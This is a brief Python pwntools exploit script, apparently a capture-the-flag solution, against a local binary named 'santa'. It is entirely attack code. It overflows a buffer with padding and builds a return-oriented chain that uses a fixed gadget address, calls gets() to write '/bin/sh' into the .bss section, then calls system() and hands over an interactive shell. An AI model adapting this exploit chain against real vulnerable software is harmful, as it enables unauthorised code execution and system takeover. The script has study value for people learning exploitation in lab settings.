from pwn import *

io = process('./santa')
elf = ELF('./santa')

print(io.recv())
io.sendline(b'1')
print(io.recv())
payload = b'AAAABBBBCCCC'
payload += p64(0x0000000000400b23)
payload += p64(elf.bss())
payload += p64(elf.sym['gets'])
payload += p64(elf.sym['system'])
io.sendline(payload)
io.send(b'/bin/sh')
io.interactive()